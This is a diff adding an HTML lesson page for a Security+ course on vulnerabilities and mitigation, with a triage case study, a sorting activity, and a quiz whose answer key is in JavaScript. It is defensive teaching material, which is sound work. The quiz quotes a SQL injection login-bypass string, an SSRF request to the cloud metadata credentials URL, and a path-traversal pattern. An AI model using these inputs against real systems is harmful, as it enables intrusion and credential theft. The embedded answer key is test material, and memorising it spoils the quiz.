+          <div class="drag-item" draggable="true" data-answer="Segmentation" id="d4-3">Ransomware spreading across all VLANs</div>
+          <div class="drag-item" draggable="true" data-answer="Access-Control" id="d4-4">User with Domain Admin for daily tasks</div>
+          <div class="drag-item" draggable="true" data-answer="Patching" id="d4-5">CVE with CVSS 9.8 on web server OS</div>
+          <div class="drag-item" draggable="true" data-answer="Hardening" id="d4-6">Web server running Telnet &amp; FTP services</div>
+          <div class="drag-item" draggable="true" data-answer="Isolation" id="d4-7">Suspicious email attachment needing analysis</div>
+          <div class="drag-item" draggable="true" data-answer="Segmentation" id="d4-8">OT network accessible from corporate LAN</div>
+          <div class="drag-item" draggable="true" data-answer="Access-Control" id="d4-9">S3 bucket with public read access enabled</div>
+          <div class="drag-item" draggable="true" data-answer="Isolation" id="d4-10">Legacy ICS controller that cannot be patched</div>
+        </div>
+
+        <div class="drop-zones-mit">
+          <div class="drop-zone" id="zone4-Patching" data-zone="Patching">
+            <div class="drop-zone-label"><span class="dz-dot" style="background:var(--green);"></span> Patching</div>
+          </div>
+          <div class="drop-zone" id="zone4-Hardening" data-zone="Hardening">
+            <div class="drop-zone-label"><span class="dz-dot" style="background:var(--blue);"></span> Hardening</div>
+          </div>
+          <div class="drop-zone" id="zone4-Segmentation" data-zone="Segmentation">
+            <div class="drop-zone-label"><span class="dz-dot" style="background:var(--purple);"></span> Segmentation</div>
+          </div>
+          <div class="drop-zone" id="zone4-Isolation" data-zone="Isolation">
+            <div class="drop-zone-label"><span class="dz-dot" style="background:var(--amber);"></span> Isolation / Sandboxing</div>
+          </div>
+          <div class="drop-zone" id="zone4-Access-Control" data-zone="Access-Control">
+            <div class="drop-zone-label"><span class="dz-dot" style="background:var(--teal);"></span> Access Control</div>
+          </div>
+        </div>
+
+        <div class="activity-actions">
+          <button class="btn-primary" onclick="checkAct4()">Check Answers</button>
+          <button class="btn-secondary" onclick="resetAct4()">Reset</button>
+        </div>
+        <div class="activity-result" id="act4-result"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================================
+       ACTIVITY 2 — VULNERABILITY TRIAGE CASE STUDY
+       ============================================================ -->
+  <div class="section-gap">
+    <div class="section-label">Interactive Activity 2</div>
+    <div class="activity-box">
+      <div class="activity-header">
+        <span class="activity-badge">Activity 2</span>
+        <div>
+          <h3>Vulnerability Triage Case Study</h3>
+          <p>Select a vulnerability to see its full risk profile, CVSS context, business impact, and recommended mitigation stack</p>
+        </div>
+      </div>
+      <div class="activity-body">
+        <div class="activity-instructions">
+          <strong>Instructions:</strong> A security scan of a mid-sized financial services firm has returned four vulnerability findings. Click each finding card to explore the complete risk analysis — CVSS context, exploitability, business impact, and a prioritized mitigation plan. Practice explaining WHY each mitigation was selected.
+        </div>
+
+        <div class="triage-grid" id="triage-grid">
+          <div class="triage-vuln" onclick="showTriage(0,this)" id="tv0">
+            <h4>🔴 <span class="sev-badge sev-critical">CVSS 9.8</span> CVE-2023-XXXX — RCE in Payment Gateway API</h4>
+            <p>Remote Code Execution vulnerability in the firm's payment processing API middleware. Unauthenticated — no credentials required. Public PoC exploit available on GitHub.</p>
+          </div>
+          <div class="triage-vuln" onclick="showTriage(1,this)" id="tv1">
+            <h4>🟠 <span class="sev-badge sev-high">CVSS 7.5</span> SQL Injection in Customer Portal Login</h4>
+            <p>The customer portal login page does not sanitize user input. A malicious parameter allows authentication bypass and potential access to the customer database.</p>
+          </div>
+          <div class="triage-vuln" onclick="showTriage(2,this)" id="tv2">
+            <h4>🟠 <span class="sev-badge sev-high">CVSS 8.1</span> Public S3 Bucket — Statement Archive</h4>
+            <p>An AWS S3 bucket containing 18 months of customer account statements is configured for public read access. No sensitive data classified as PII has been confirmed exposed yet.</p>
+          </div>
+          <div class="triage-vuln" onclick="showTriage(3,this)" id="tv3">
+            <h4>🔵 <span class="sev-badge sev-medium">CVSS 5.3</span> Excessive IAM Permissions on Dev Account</h4>
+            <p>A developer IAM account has AdministratorAccess policy attached. The account is used for daily development work and is not subject to MFA enforcement.</p>
+          </div>
+        </div>
+
+        <div class="triage-detail" id="triage-detail-0">
+          <h4>🔴 Full Analysis: RCE in Payment Gateway API (CVSS 9.8)</h4>
+          <div class="detail-row">
+            <div class="detail-cell"><div class="detail-cell-label">Attack Vector</div><div class="detail-cell-val">Network (internet-facing)</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Auth Required</div><div class="detail-cell-val">None — unauthenticated</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Exploit Available</div><div class="detail-cell-val">Yes — public GitHub PoC</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Business Impact</div><div class="detail-cell-val">PCI DSS scope — cardholder data at risk</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">CIA Impact</div><div class="detail-cell-val">C: High / I: High / A: High</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Priority</div><div class="detail-cell-val" style="color:var(--red);font-weight:700;">IMMEDIATE — patch within hours</div></div>
+          </div>
+          <div class="detail-mits">
+            <h5>Recommended Mitigation Stack:</h5>
+            <span class="mit-pill">1. Emergency patch/update — apply vendor fix immediately</span>
+            <span class="mit-pill">2. WAF virtual patch — block exploit pattern while patching</span>
+            <span class="mit-pill">3. Network segmentation — isolate payment API from other services</span>
+            <span class="mit-pill">4. Rate limiting — restrict API call volume to slow exploitation attempts</span>
+            <span class="mit-pill">5. Enhanced logging — capture all API requests for forensic readiness</span>
+          </div>
+          <div class="callout" style="margin-top:14px;">A public PoC elevates a CVSS 9.8 to effectively CVSS 10.0 operational priority. Even a one-hour window of exposure is unacceptable for a PCI-scoped system. If patching cannot be completed within the hour, the WAF virtual patch is the immediate compensating control while the emergency patch is prepared and tested.</div>
+        </div>
+
+        <div class="triage-detail" id="triage-detail-1">
+          <h4>🟠 Full Analysis: SQL Injection in Customer Portal (CVSS 7.5)</h4>
+          <div class="detail-row">
+            <div class="detail-cell"><div class="detail-cell-label">Attack Vector</div><div class="detail-cell-val">Network (public-facing web)</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Auth Required</div><div class="detail-cell-val">None — pre-authentication</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Exploit Available</div><div class="detail-cell-val">Generic SQLi tools (sqlmap)</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Business Impact</div><div class="detail-cell-val">Customer PII exposure — GDPR/CCPA scope</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">CIA Impact</div><div class="detail-cell-val">C: High / I: High / A: Low</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Priority</div><div class="detail-cell-val" style="color:var(--amber);font-weight:700;">HIGH — remediate within 24–48 hours</div></div>
+          </div>
+          <div class="detail-mits">
+            <h5>Recommended Mitigation Stack:</h5>
+            <span class="mit-pill">1. Code fix — replace dynamic queries with parameterized queries</span>
+            <span class="mit-pill">2. WAF rule — block SQLi patterns as interim compensating control</span>
+            <span class="mit-pill">3. Input validation — allowlist expected input formats server-side</span>
+            <span class="mit-pill">4. Database least privilege — app account should not have DROP/DELETE rights</span>
+            <span class="mit-pill">5. DAST scanning — validate fix and scan for related injection points</span>
+          </div>
+          <div class="callout" style="margin-top:14px;">SQL injection is entirely preventable through parameterized queries — this is a secure coding failure, not an advanced attack. The WAF provides temporary protection but is not a substitute for fixing the code. Database least privilege limits the damage if exploitation occurs before patching — an app account with read-only access cannot DROP tables.</div>
+        </div>
+
+        <div class="triage-detail" id="triage-detail-2">
+          <h4>🟠 Full Analysis: Public S3 Bucket — Statement Archive (CVSS 8.1)</h4>
+          <div class="detail-row">
+            <div class="detail-cell"><div class="detail-cell-label">Attack Vector</div><div class="detail-cell-val">Network (public internet)</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Auth Required</div><div class="detail-cell-val">None — world-readable</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Exploit Available</div><div class="detail-cell-val">No exploit needed — it's public</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Business Impact</div><div class="detail-cell-val">Regulatory breach — GLBA / PCI scope</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">CIA Impact</div><div class="detail-cell-val">C: Critical / I: Low / A: Low</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Priority</div><div class="detail-cell-val" style="color:var(--amber);font-weight:700;">IMMEDIATE — toggle access setting now</div></div>
+          </div>
+          <div class="detail-mits">
+            <h5>Recommended Mitigation Stack:</h5>
+            <span class="mit-pill">1. Disable public access — one AWS console click (do this now)</span>
+            <span class="mit-pill">2. Enable S3 bucket logging — determine if data was accessed</span>
+            <span class="mit-pill">3. CSPM alert — configure AWS Config rule to prevent recurrence</span>
+            <span class="mit-pill">4. Legal review — assess notification obligations (GLBA, state breach laws)</span>
+            <span class="mit-pill">5. IAM policy review — who had write access to set this configuration?</span>
+          </div>
+          <div class="callout-amber" style="margin-top:14px;">This is a classic cloud misconfiguration — no exploit required. The remediation (disabling public access) takes literally one click in the AWS console. The delay in a case like this is never technical; it's the delay in discovery. CSPM tools (AWS Security Hub, Prisma Cloud) provide continuous monitoring to detect this configuration the moment it occurs.</div>
+        </div>
+
+        <div class="triage-detail" id="triage-detail-3">
+          <h4>🔵 Full Analysis: Excessive IAM Permissions on Dev Account (CVSS 5.3)</h4>
+          <div class="detail-row">
+            <div class="detail-cell"><div class="detail-cell-label">Attack Vector</div><div class="detail-cell-val">Credential compromise</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Auth Required</div><div class="detail-cell-val">Valid AWS credentials needed</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Exploit Available</div><div class="detail-cell-val">Post-compromise privilege escalation</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Business Impact</div><div class="detail-cell-val">Full AWS account compromise if credentials stolen</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">CIA Impact</div><div class="detail-cell-val">C: High / I: High / A: High (if credentials stolen)</div></div>
+            <div class="detail-cell"><div class="detail-cell-label">Priority</div><div class="detail-cell-val" style="color:var(--blue);font-weight:700;">HIGH — remediate within 7 days</div></div>
+          </div>
+          <div class="detail-mits">
+            <h5>Recommended Mitigation Stack:</h5>
+            <span class="mit-pill">1. Remove AdministratorAccess — replace with scoped developer policy</span>
+            <span class="mit-pill">2. Enforce MFA — mandatory for all IAM users accessing AWS console</span>
+            <span class="mit-pill">3. IAM Access Analyzer — identify all over-permissioned accounts</span>
+            <span class="mit-pill">4. CloudTrail audit — review account activity for anomalies</span>
+            <span class="mit-pill">5. Implement permission boundaries — maximum permissions any role can have</span>
+          </div>
+          <div class="callout-blue" style="margin-top:14px;">This is a lower CVSS score because credential compromise is required — an attacker can't directly exploit this over the network. But if this developer's credentials are phished or leaked in a breach database, the attacker gains full AWS admin access. The risk is a multiplier: this finding alone may be CVSS 5.3, but combined with a phishing campaign (Lesson 3), it becomes catastrophic. Least privilege is not optional — it is the primary defense against credential compromise scenarios.</div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================================
+       QUIZ — 5 QUESTIONS
+       ============================================================ -->
+  <div class="section-gap">
+    <div class="section-label">Lesson 4 Quiz — 5 Questions</div>
+    <div class="activity-box">
+      <div class="activity-header">
+        <span class="activity-badge">Assessment</span>
+        <div>
+          <h3>Knowledge Check: Vulnerabilities &amp; Mitigation</h3>
+          <p>Select the best answer for each question, then submit for graded feedback</p>
+        </div>
+      </div>
+      <div class="activity-body">
+
+        <!-- Q1 -->
+        <div class="quiz-q" id="q1">
+          <div class="q-num">Question 1 of 5</div>
+          <div class="q-text">A security analyst discovers that the company's customer-facing web application appends user input directly to a SQL query string without sanitization. An attacker could enter <code>' OR '1'='1</code> in the login field to bypass authentication. Which vulnerability class does this represent, and what is the PRIMARY code-level mitigation?</div>
+          <div class="q-options">
+            <label class="q-option"><input type="radio" name="q1" value="A"> Cross-Site Scripting (XSS); mitigated by Content Security Policy headers</label>
+            <label class="q-option"><input type="radio" name="q1" value="B"> SQL Injection; mitigated by using parameterized queries (prepared statements)</label>
+            <label class="q-option"><input type="radio" name="q1" value="C"> Buffer Overflow; mitigated by enabling ASLR and DEP on the web server</label>
+            <label class="q-option"><input type="radio" name="q1" value="D"> SSRF; mitigated by restricting outbound server connections to an allowlist</label>
+          </div>
+          <div class="q-feedback" id="q1-feedback"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-q" id="q2">
+          <div class="q-num">Question 2 of 5</div>
+          <div class="q-text">A cloud security audit reveals that 14 EC2 instances in a production environment are using IAM instance profiles with <code>AdministratorAccess</code> policies attached. The instances only need to read objects from a specific S3 bucket. Which mitigation strategy MOST directly addresses this finding?</div>
+          <div class="q-options">
+            <label class="q-option"><input type="radio" name="q2" value="A"> Patching — update the EC2 instances to the latest AMI to close known vulnerabilities</label>
+            <label class="q-option"><input type="radio" name="q2" value="B"> Segmentation — place the EC2 instances in a private subnet with no internet access</label>
+            <label class="q-option"><input type="radio" name="q2" value="C"> Access Control / Least Privilege — replace AdministratorAccess with a scoped S3 read-only policy for the specific bucket</label>
+            <label class="q-option"><input type="radio" name="q2" value="D"> Isolation — move the EC2 instances to a dedicated VPC with no connections to other resources</label>
+          </div>
+          <div class="q-feedback" id="q2-feedback"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-q" id="q3">
+          <div class="q-num">Question 3 of 5</div>
+          <div class="q-text">An industrial control system (ICS) that monitors critical manufacturing equipment runs on an operating system that has reached end-of-life and cannot be updated without a $2M equipment replacement project. The system cannot be patched. Which mitigation strategy BEST reduces the risk while the organization plans the replacement?</div>
+          <div class="q-options">
+            <label class="q-option"><input type="radio" name="q3" value="A"> Apply all available OS patches immediately — EOL systems can still receive community patches</label>
+            <label class="q-option"><input type="radio" name="q3" value="B"> Network isolation and segmentation — air-gap the ICS from all other networks; enforce strict access control for the isolated segment</label>
+            <label class="q-option"><input type="radio" name="q3" value="C"> Enable full-disk encryption on the ICS — this protects the data even if the OS is compromised</label>
+            <label class="q-option"><input type="radio" name="q3" value="D"> Perform a vulnerability scan on the ICS monthly — scanning detects any exploitation attempts</label>
+          </div>
+          <div class="q-feedback" id="q3-feedback"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-q" id="q4">
+          <div class="q-num">Question 4 of 5</div>
+          <div class="q-text">An attacker sends a crafted HTTP request to a cloud-based web application that causes the application server to make an outbound HTTP request to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role</code> and returns the result to the attacker. What type of vulnerability is this, and what specific risk does it create in a cloud environment?</div>
+          <div class="q-options">
+            <label class="q-option"><input type="radio" name="q4" value="A"> Cross-Site Request Forgery (CSRF); the attacker forges requests on behalf of authenticated users to steal session tokens</label>
+            <label class="q-option"><input type="radio" name="q4" value="B"> Server-Side Request Forgery (SSRF); the attacker retrieves IAM credentials from the cloud instance metadata service, enabling cloud account takeover</label>
+            <label class="q-option"><input type="radio" name="q4" value="C"> Directory Traversal; the attacker accesses files outside the web root by manipulating path parameters</label>
+            <label class="q-option"><input type="radio" name="q4" value="D"> XML External Entity (XXE); the attacker exploits insecure XML parsing to read internal files from the server</label>
+          </div>
+          <div class="q-feedback" id="q4-feedback"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-q" id="q5">
+          <div class="q-num">Question 5 of 5</div>
+          <div class="q-text">A penetration tester's report identifies three findings at a regional bank: (1) a CVSS 6.5 vulnerability in an internal HR application with no known public exploit, (2) a CVSS 9.1 vulnerability in the internet-facing customer banking portal with an active exploit in Metasploit, and (3) a CVSS 7.8 vulnerability in a developer test server not connected to production. Based on risk-based patch prioritization, which finding should be remediated FIRST?</div>
+          <div class="q-options">
+            <label class="q-option"><input type="radio" name="q5" value="A"> Finding 1 — internal systems are harder to reach and should be secured first</label>
+            <label class="q-option"><input type="radio" name="q5" value="B"> Finding 3 — CVSS 7.8 is higher than CVSS 6.5 so it should be prioritized over Finding 1</label>
+            <label class="q-option"><input type="radio" name="q5" value="C"> Finding 2 — the combination of internet-facing exposure, critical CVSS score, and active Metasploit exploit module creates the highest immediate risk</label>
+            <label class="q-option"><input type="radio" name="q5" value="D"> All three simultaneously — CVSS scores above 6.0 are all High severity and should be patched in the same maintenance window</label>
+          </div>
+          <div class="q-feedback" id="q5-feedback"></div>
+        </div>
+
+        <div class="quiz-submit-row">
+          <button class="btn-primary" onclick="submitQuiz()">Submit Quiz</button>
+          <button class="btn-secondary" onclick="resetQuiz()">Reset</button>
+        </div>
+        <div id="quiz-result"></div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- end page-body -->
+
+<!-- ============================================================
+     FOOTER
+     ============================================================ -->
+<div class="page-footer">
+  <div class="footer-nav">
+    <a href="index.html">← Course Home</a>
+    <a href="lesson03.html">← Lesson 3: Threat Actors</a>
+    <a href="lesson04-part01.png" target="_blank" rel="noopener">Topic 1 Graphic</a>
+    <a href="lesson04-part02.png" target="_blank" rel="noopener">Topic 2 Graphic</a>
+    <a href="lesson04-part03.png" target="_blank" rel="noopener">Topic 3 Graphic</a>
+    <a href="lesson05.html">Next: Secure Architecture &rarr;</a>
+  </div>
+  CompTIA Security+ SY0-701 &nbsp;|&nbsp; Lesson 4: Vulnerabilities &amp; Mitigation &nbsp;|&nbsp; Moraine Valley Community College
+</div>
+
+<!-- ============================================================
+     JAVASCRIPT
+     ============================================================ -->
+<script>
+/* ---- THEME ---- */
+function toggleTheme() {
+  const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
+  const next = isDark ? 'light' : 'dark';
+  document.documentElement.setAttribute('data-theme', next);
+  document.getElementById('themeBtn').textContent = next === 'dark' ? '☀️ Light' : '🌙 Dark';
+  localStorage.setItem('secplus-theme', next);
+}
+(function () {
+  const saved = localStorage.getItem('secplus-theme');
+  if (saved === 'dark') {
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.getElementById('themeBtn').textContent = '☀️ Light';
+  }
+})();
+
+/* ============================================================
+   ACTIVITY 1 — DRAG & DROP
+   ============================================================ */
+let dragging4 = null;
+
+document.querySelectorAll('#dp4 .drag-item').forEach(item => {
+  item.addEventListener('dragstart', e => {
+    dragging4 = item.id;
+    item.classList.add('dragging');
+    e.dataTransfer.effectAllowed = 'move';
+  });
+  item.addEventListener('dragend', () => item.classList.remove('dragging'));
+});
+
+document.querySelectorAll('[id^="zone4-"]').forEach(zone => {
+  zone.addEventListener('dragover', e => { e.preventDefault(); zone.classList.add('drag-over'); });
+  zone.addEventListener('dragleave', () => zone.classList.remove('drag-over'));
+  zone.addEventListener('drop', e => {
+    e.preventDefault();
+    zone.classList.remove('drag-over');
+    const item = document.getElementById(dragging4);
+    if (!item) return;
+    const isCorrect = item.dataset.answer === zone.dataset.zone;
+    const chip = document.createElement('span');
+    chip.className = 'dropped-item ' + (isCorrect ? 'correct' : 'incorrect');
+    chip.dataset.itemId = dragging4;
+    const lbl = item.textContent.length > 38 ? item.textContent.substring(0, 38) + '…' : item.textContent;
+    chip.innerHTML = lbl + ' <span class="rm">×</span>';
+    chip.querySelector('.rm').addEventListener('click', () => returnItem4(dragging4, chip));
+    zone.appendChild(chip);
+    item.style.display = 'none';
+    document.getElementById('act4-result').style.display = 'none';
+  });
+});
+
+function returnItem4(id, chip) {
+  const item = document.getElementById(id);
+  if (item) item.style.display = '';
+  chip.remove();
+}
+
+function checkAct4() {
+  let correct = 0, total = 0;
+  document.querySelectorAll('[id^="zone4-"]').forEach(zone => {
+    zone.querySelectorAll('.dropped-item').forEach(chip => {
+      total++;
+      const item = document.getElementById(chip.dataset.itemId);
+      if (item && item.dataset.answer === zone.dataset.zone) {
+        chip.className = 'dropped-item correct'; correct++;
+      } else {
+        chip.className = 'dropped-item incorrect';
+        chip.style.animation = 'none'; void chip.offsetWidth; chip.style.animation = '';
+      }
+    });
+  });
+  const res = document.getElementById('act4-result');
+  res.style.display = 'block';
+  if (total === 0) { res.className = 'activity-result result-fail'; res.textContent = 'Sort at least one item before checking.'; return; }
+  if (correct === total && total === 10) {
+    res.className = 'activity-result result-pass';
+    res.textContent = '✅ Perfect! All 10 vulnerability scenarios correctly matched to their primary mitigation strategy.';
+  } else {
+    res.className = 'activity-result result-fail';
+    res.textContent = `${correct}/${total} correct. Red chips are mismatched. Hint: Ask — does this fix a known flaw (patch), reduce exposure (harden), contain spread (segment), quarantine risk (isolate), or limit permissions (access control)?`;
+  }
+}
+
+function resetAct4() {
+  document.querySelectorAll('[id^="zone4-"] .dropped-item').forEach(chip => returnItem4(chip.dataset.itemId, chip));
+  document.getElementById('act4-result').style.display = 'none';
+}
+
+/* ============================================================
+   ACTIVITY 2 — TRIAGE CASE STUDY
+   ============================================================ */
+let currentTriage = -1;
+
+function showTriage(idx, el) {
+  for (let i = 0; i < 4; i++) {
+    document.getElementById('triage-detail-' + i).classList.remove('visible');
+  }
+  document.querySelectorAll('.triage-vuln').forEach(c => c.classList.remove('selected'));
+
+  if (currentTriage === idx) {
+    currentTriage = -1;
+    return;
+  }
+  currentTriage = idx;
+  el.classList.add('selected');
+  const detail = document.getElementById('triage-detail-' + idx);
+  detail.classList.add('visible');
+  detail.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+}
+
+/* ============================================================
+   QUIZ
+   ============================================================ */
+const qAnswers = { q1: 'B', q2: 'C', q3: 'B', q4: 'B', q5: 'C' };
+const qFeedback = {
+  q1: {
+    correct: "✅ Correct! This is SQL Injection — the attacker injects SQL syntax into user input that is passed directly to a database query without sanitization. The primary code-level fix is parameterized queries (prepared statements): the SQL code and user data are separated so the database never interprets user input as SQL syntax. A WAF can provide interim protection but is not a substitute for fixing the code. XSS involves client-side script injection; buffer overflow involves memory corruption; SSRF involves server-side HTTP requests.",
+    wrong:   "❌ The correct answer is B — SQL Injection, mitigated by parameterized queries. The <code>' OR '1'='1</code> payload is the canonical SQL injection test string — it is designed to make the WHERE clause always evaluate to true, bypassing login checks. XSS injects JavaScript into web pages. Buffer overflow overwrites memory. SSRF manipulates server-side URL requests. Only parameterized queries eliminate the root cause by ensuring user input is always treated as data, never as executable SQL."
+  },
+  q2: {
+    correct: "✅ Correct! This is a least privilege / access control finding. The EC2 instances have AdministratorAccess when they only need to read from a specific S3 bucket — that is an enormous overpermission. The correct mitigation is replacing the admin policy with a scoped IAM policy granting only <code>s3:GetObject</code> on the specific bucket ARN. Patching addresses software CVEs, not IAM configuration. Segmentation controls network access but doesn't fix the permission scope. Isolation doesn't address the root cause — the permission is too broad regardless of network placement.",
+    wrong:   "❌ The correct answer is C — Access Control / Least Privilege. The vulnerability is not a software CVE (patching won't help), not a network exposure issue (segmentation doesn't fix overpermissioned IAM), and not an isolation problem. The core issue is that the IAM policy grants far more permissions than the application requires. Principle of least privilege requires that every role, user, and service account have only the minimum permissions needed for its specific function."
+  },
+  q3: {
+    correct: "✅ Correct! When patching is not possible — as with EOL systems — the primary risk mitigation strategy is network isolation and segmentation. By air-gapping the ICS from all other networks and enforcing strict access controls on the isolated segment, you eliminate the network attack vector that most exploits depend on. Full-disk encryption protects data at rest but doesn't prevent code execution exploits. Vulnerability scanning detects but doesn't prevent exploitation. Community patches for EOL OS versions are unreliable and unsupported.",
+    wrong:   "❌ The correct answer is B — Network isolation and segmentation. This is a classic compensating control scenario: the primary control (patching) is not feasible, so an alternative safeguard must provide equivalent protection. Isolating the ICS eliminates the primary attack vector (network-based exploitation). This is also the NIST recommendation for EOL and legacy systems that cannot be patched — isolate, monitor, and plan for replacement."
+  },
+  q4: {
+    correct: "✅ Correct! This is Server-Side Request Forgery (SSRF). The attacker induces the application server to make a request to the AWS EC2 instance metadata service URL (169.254.169.254), which returns the IAM credentials for the instance's attached role. With those credentials, the attacker can authenticate to AWS and perform any action the role permits — potentially including reading all S3 data, creating new IAM users, or launching additional resources. This is exactly the mechanism used in the Capital One breach (2019). SSRF is an exam hot topic in SY0-701.",
+    wrong:   "❌ The correct answer is B — SSRF (Server-Side Request Forgery). CSRF involves the browser making forged requests on behalf of an authenticated user. Directory traversal manipulates file paths (../../etc/passwd patterns). XXE exploits XML parser entity expansion. SSRF is specifically the attack where the server itself is tricked into making outbound HTTP requests — in AWS, this reaches the metadata service at 169.254.169.254, which is only accessible from within the EC2 instance. The IAM credentials returned enable full cloud account actions."
+  },
+  q5: {
+    correct: "✅ Correct! Risk-based prioritization goes beyond CVSS scores alone. Finding 2 has three compounding risk factors: (1) the highest CVSS score of the internet-facing systems (9.1 Critical), (2) public internet exposure — anyone on the internet can reach it, and (3) an active Metasploit exploit module means the exploit is packaged and ready for use by any attacker with basic skills, no custom development required. Finding 3 has a higher CVSS (7.8) than Finding 1 (6.5), but its isolation from production dramatically reduces business impact. Finding 1 is internal with no known public exploit. CVSS alone is never sufficient for prioritization — attack surface, exploitability-in-the-wild, and business impact must be considered.",
+    wrong:   "❌ The correct answer is C — Finding 2. CVSS score is not the only prioritization factor. Finding 2 combines Critical CVSS + internet-facing exposure + active exploit in Metasploit — this trifecta creates immediate, high-probability risk. Finding 3 has a higher CVSS than Finding 1, but it is in a test environment with no production connectivity — the blast radius is minimal. Patching everything simultaneously is operationally impossible and risks deploying untested patches. Risk-based prioritization weighs severity, exploitability, asset exposure, and business impact together."
+  }
+};
+
+function submitQuiz() {
+  let score = 0;
+  Object.keys(qAnswers).forEach(qid => {
+    const selected = document.querySelector(`input[name="${qid}"]:checked`);
+    const qDiv = document.getElementById(qid);
+    const fb = document.getElementById(qid + '-feedback');
+    qDiv.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
+    if (!selected) {
+      fb.className = 'q-feedback show fail';
+      fb.innerHTML = '⚠️ No answer selected. ' + qFeedback[qid].wrong;
+      qDiv.className = 'quiz-q answered-wrong';
+      return;
+    }
+    const isCorrect = selected.value === qAnswers[qid];
+    if (isCorrect) score++;
+    qDiv.className = 'quiz-q ' + (isCorrect ? 'answered-correct' : 'answered-wrong');
+    fb.className = 'q-feedback show ' + (isCorrect ? 'pass' : 'fail');
+    fb.innerHTML = qFeedback[qid][isCorrect ? 'correct' : 'wrong'];
+    qDiv.querySelectorAll('.q-option').forEach(opt => {
+      const v = opt.querySelector('input').value;
+      if (v === qAnswers[qid]) opt.classList.add('correct');
+      else if (selected && v === selected.value && !isCorrect) opt.classList.add('wrong');
+    });
+  });
+  const result = document.getElementById('quiz-result');
+  result.style.display = 'block';
+  const pct = Math.round((score / 5) * 100);
+  if (score >= 4) {
+    result.className = 'quiz-pass';
+    result.innerHTML = `🎉 <strong>Excellent! ${score}/5 (${pct}%)</strong> — Strong grasp of vulnerability types and mitigation selection. Ready for Lesson 5: Secure Architecture. <a href="lesson05.html" style="color:var(--green-dark);font-weight:700;margin-left:8px;">Next Lesson →</a>`;
+  } else {
+    result.className = 'quiz-fail';
+    result.innerHTML = `📚 <strong>${score}/5 (${pct}%)</strong> — Review the explanations above. Focus on the OWASP Top 10 web vulnerabilities, the mitigation selection framework table, and the vulnerability triage case study in Activity 2. The key skill is matching vulnerability class to the correct mitigation strategy — not just knowing the names.`;
+  }
+  result.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}
+
+function resetQuiz() {
+  document.querySelectorAll('.quiz-q').forEach(q => q.className = 'quiz-q');
+  document.querySelectorAll('input[type="radio"]').forEach(r => { r.checked = false; r.disabled = false; });
+  document.querySelectorAll('.q-option').forEach(o => o.classList.remove('correct', 'wrong'));
+  document.querySelectorAll('.q-feedback').forEach(f => { f.className = 'q-feedback'; f.innerHTML = ''; });
+  const result = document.getElementById('quiz-result');
+  result.style.display = 'none'; result.className = '';
+}
+</script>
+</body>
+</html>
